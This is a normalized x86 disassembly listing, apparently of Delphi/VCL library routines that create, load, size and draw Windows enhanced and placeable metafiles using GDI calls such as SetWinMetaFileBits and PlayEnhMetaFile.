mov esi eax
mov eax [ esi + 0x4 ]
call sub_40324c
mov eax [ esi + 0x8 ]
call sub_40324c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_425b70
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_41a0dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_425bb4
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_41a0dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425c18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
call sub_425bd8
call sub_425bf8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_425c58
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a7b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_425c88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_403194
mov edx eax
mov eax [ ebx + 0xc ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41a8c0
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_425cbc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_4033d8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40324c
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403460
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403460
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403448
sub_425d68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_425df8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_40324c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403194
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403460
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403460
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425e48
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_425d68
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_425d68
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41a7dc
mov edx ebx
mov eax esi
call sub_425d68
jmp r-xdata
pop esi
pop ebx
retn
sub_425ea4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_425bd8
mov ecx esi
mov edx ebx
call sub_425940
pop esi
pop ebx
pop ebp
retn 0x4
sub_425ec8
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_425eea
mov eax eax
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_425f14
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42601b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_404200
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_4259d4
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_40324c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425f9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426022
lea eax [ ebp - 0x48 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403460
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403460
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_425fa2
mov eax [ ebp - 0x4 ]
call sub_40324c
call sub_403a00
call sub_403a54
mov eax [ ebx + 0xc ]
call sub_40324c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426022
lea eax [ ebp - 0x48 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403460
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403460
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_42602c
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_40319c
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402b48
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_426088
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_426104
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_425f14
mov eax [ ebp - 0x8 ]
push eax
push sub_42602c
push ebp
call sub_426088
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426180
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4221c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_4261c0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426230
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_426690
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_4266f8
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
xor edx edx
mov eax esi
call sub_426258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426237
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
add esp 0xfffffff0
call sub_403570
sub_426237
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_426258
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_426464
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_423870
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58 ] edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403570
xor edx edx
push ebp
push sub_426447
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42680c
test eax eax
jne r-xdata
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4267f4
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4267f4
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42680c
mov ecx eax
xor edx edx
xor eax eax
call sub_418e04
mov eax ebx
call sub_40425c
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
push 0x8
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_426e6c
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426e6c
jmp r-xdata
push ebx
push r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_40431c
mov eax [ ebp - 0x20 ]
call sub_40445c
jmp r-xdata
mov eax esi
call sub_40425c
test eax eax
jle r-xdata
push 0xa
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_426e30
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_426e30
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
call CreateEnhMetaFileA
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42644e
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
call sub_4241b8
retn
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
sub_42646b
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42649f
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
call sub_4035d8
mov ebx edx
mov edi eax
mov eax edi
call sub_423e68
mov esi eax
xor edx edx
mov eax edi
call sub_423ee8
push esi
call CloseEnhMetaFile
mov edx eax
mov eax [ edi + 0x58 ]
call sub_426d2c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_423934
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c0
sub_4264f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4253e0
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42653c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_4276e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a7b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_42656c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_4276e8
mov edx esi
mov eax ebx
call sub_41a7dc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_4276e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_426600
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_423e68
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_423e68
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_423e68
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_423e68
push eax
call SelectPalette
sub_426690
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f9c
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax esi
mov edx edi
call sub_4045e8
mov eax [ esi ]
call sub_40445c
push eax
push edi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ esi ]
call sub_40445c
call sub_408904
mov edx eax
mov eax esi
call sub_4045e8
sub_4266f8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403f9c
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax ebx
mov edx edi
call sub_4045e8
mov eax [ ebx ]
call sub_40445c
push eax
push edi
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ ebx ]
call sub_40445c
call sub_408904
mov ecx eax
inc ecx
mov eax ebx
mov edx 0x1
call sub_4044fc
mov eax [ ebx ]
call sub_40445c
call sub_408904
mov edx eax
mov eax ebx
call sub_4045e8
sub_426790
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426968
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_426824
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4221c4
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_4268b0
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_426968
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_426914
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_426f20
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41be78
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_426acc
mov edx esi
mov eax ebx
call sub_4269fc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_426968
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_4276e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_4276e4
pop esi
pop ebx
retn
sub_426990
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_426f20
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_426acc
mov edx esi
mov eax ebx
call sub_4269fc
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_4269fc
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_426968
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41c0a4
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4027b4
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_426abc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4029b0
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41c0a4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424158
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ac3
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4027d4
retn
call sub_424158
sub_426acc
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_426968
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_424158
lea eax [ ebp - 0x22 ]
call sub_424fa8
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4027b4
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_426c3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424158
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426c42
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4027d4
retn
call sub_424158
sub_426c4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426cf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_426cd1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
